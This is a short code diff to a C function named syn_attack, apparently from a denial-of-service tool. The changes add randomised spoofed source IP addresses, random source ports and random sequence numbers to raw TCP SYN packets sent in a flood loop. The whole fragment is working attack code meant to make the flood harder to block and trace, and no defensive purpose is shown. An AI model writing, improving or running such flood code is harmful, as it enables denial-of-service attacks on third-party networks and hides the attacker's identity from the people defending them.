@@ -84,13 +84,19 @@ void* syn_attack(void* arg) {
             data[i] = rand() & 0xFF;
         }
 
+        iph->saddr = htonl((uint32_t)(rand() << 16) | (rand() & 0xFFFF));
         iph->id = htons((uint16_t)(rand() & 0xFFFF));
+
+        if (params->srcport == 0) {
+            tcph->source = htons((uint16_t)(1024 + (rand() % 64511)));
+        }
+        tcph->seq = htonl((uint32_t)rand());
+
         iph->check = 0;
         tcph->check = 0;
-        
         iph->check = generic_checksum((unsigned short*)iph, ip_size);
         tcph->check = tcp_udp_checksum(tcph, tcp_size, iph->saddr, iph->daddr, IPPROTO_TCP);
-        
+
         ssize_t sent = sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));
         if (sent < 0) break;
     }
